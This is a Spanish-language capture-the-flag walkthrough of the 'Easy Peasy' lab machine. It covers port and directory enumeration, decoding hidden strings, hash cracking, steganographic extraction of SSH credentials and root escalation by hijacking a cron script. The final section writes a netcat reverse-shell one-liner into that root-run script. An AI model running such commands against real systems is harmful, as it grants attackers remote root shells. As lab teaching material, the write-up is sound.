# Easypeasyctf 

Security, Owasp top 10, Cron. (#nmap, #samba, #suid, #pathvarmanipulation #smb )

## Tabla de contenido

- [Enumeración](#Enumeración).
- [Web Site](#Web-Site).
- [Shell](#Shell).


--------------------------------
### Enumeración
-------------------------------
Hacemos una revisión general:
```
nmap 10.10.5.224 -p- --open -T5 -v -n -oG allPorts
```
* -p-      : Busca todos los puertos
* --open   : Muestra los puertos abiertos
* -T5      : Mayor velocidad
* -v       : Verbose mostrará el resultado mientras va scaneando
* -n       : No hacer resolución DNS 
* -oG      : Exportar en formato grepeable
* allPorts : Nombre de donde se exportará

El resultado es:
```
Initiating ARP Ping Scan at 04:45
Scanning 10.10.5.224 [1 port]
Completed ARP Ping Scan at 04:45, 0.22s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 04:45
Scanning 10.10.5.224 [65535 ports]
Discovered open port 80/tcp on 10.10.5.224
Discovered open port 6498/tcp on 10.10.5.224
Discovered open port 65524/tcp on 10.10.5.224
Completed SYN Stealth Scan at 04:46, 25.72s elapsed (65535 total ports)
Nmap scan report for 10.10.5.224
Host is up (0.0015s latency).
Not shown: 65355 closed ports, 177 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
MAC Address: 02:D6:F4:AF:0D:9B (Unknown)

```

Hacemos una revisión más específica:
```
nmap -p 80,6498,65524 10.10.5.224 -sC -sV
```

El resultado es:
```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (EdDSA)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
```

--------------------------------
#### Compromising the machine
-------------------------------

Como se pudo ver en el scaner de puertos existen servicios Http corriendo en el servidor, con ayuda de gobuster listaremos directorios existente.
```
gobuster dir -u http://10.10.84.221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

El resultado es el siguiente:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.84.221
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/21 21:16:59 Starting gobuster
===============================================================
/hidden (Status: 301)
===============================================================
2020/11/21 21:19:07 Finished
===============================================================
```
Volvemos a enumerar dentro del directorio "hidden"
```
gobuster dir -e -u http://10.10.84.221/hidden -w /usr/share/wordlists/dirb/common.txt
```
El resultado es:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.84.221/hidden
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/11/21 22:21:50 Starting gobuster
===============================================================
http://10.10.84.221/hidden/index.html (Status: 200)
http://10.10.84.221/hidden/whatever (Status: 301)
===============================================================
2020/11/21 22:21:50 Finished
===============================================================
```
En la ruta obtenida "http://10.10.84.221/hidden/whatever/" accedemos al código de la página y obtenemos:
```
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ5tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```

Se aprecia un base64 decodificamos y obtenemos la flag:
```
echo 'ZmxhZ5tmMXJzN19mbDRnfQ=='| base64 -d
```
 

Así mismo:
```
gobuster dir -u http://10.10.84.221:65524 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
El resultado es el siguiente:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.84.221:65524
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/21 21:14:34 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/11/21 21:16:46 Finished
===============================================================
```
Así mismo al inpeccionar elemento para ver el código fuente se muestra lo siguiente:
```
  </head>
  <body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#flag">hi</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>
-->
```
Como se puede ver "its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu". Utilizamos un script que determina que tipo de encriptación es (base64, base62, base32, etc):
```
git clone https://github.com/mufeedvh/basecrack.git
cd basecrack
pip install -r requirements.txt
python basecrack.py -b ObsJmP173N2X6dOrAgEAL0Vu
```
El resultado es el siguiente:
```
[-] Encoded Base: ObsJmP173N2X6dOrAgEAL0Vu

[>] Decoding as Base62: /n--------------r

[>] Decoding as Base92: ÷&4øV£ë°NZK$ù,

```
Utilizando el directorio obtenido "http://10.10.16.79:65524/n-----------r/ observamos el código fuente:
```
<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;


	}
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```
Utilizamos john de ripper para desencriptar la contraseña:
```
john --wordlist=list.txt hash
```



Probamos el directorio comun "http://10.10.84.221:65524/robots.txt"
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b251
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
Decodificamos el hash y obtenemos la segunda bandera

Dentro de la configuracion de Apache2 se encuentra al tercera bandera así mismo decodificaremos el hash que tiene dicha bandera


Descargamos la imagen "binarycodepixabay.jpg", utilizando la herramienta steghide descubriremos que guarda la imagen:
```
steghide info binarycodepixabay.jpg
---------------------------------------
"binarycodepixabay.jpg":
  format: jpeg
  capacity: 4.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secrettext.txt":
    size: 278.0 Byte
    encrypted: no
    compressed: no
---------------------------------------
steghide extract -sf binarycodepixabay.jpg
--------------------
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 0111100-
---------------------
```

A través del página "https://www.rapidtables.com/convert/number/binary-to-ascii.html" traducimos el binario a ASCII/UTF-8 y obtenemos la contraseña SSH.

```
ssh boring@10.10.21.123 -p 6498
```

Encontramos el directorio "/home/boring/user.txt" lo pintamos en consola:
```
cat /home/boring/user.txt
------------------------
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4-}
------------------------
```
Utilizamos la página "https://www.dcode.fr/caesar-cipher" que contiene una herramienta que decodificará dicha llave.

Buscamos los cron activos y los listamos:
```
cat /etc/crontab
------------------
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
------------------
```
Observamos que ejecuta con privilegios root un script ubicado dentro "/var/www/" llamado ".mysecretcronjob.sh"

Editamos dicho archivo:
```
nano .mysecretcronjob.sh
--------------------
#!/bin/bash
# i will run as root
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
--------------------
```
Agregando la última línea para crear el shell reverso, mientras que en la pc que recibirá la conexión:
```
nc -lvp 1234
```
Finalmente al generar la conexión tendermos un shell como root.


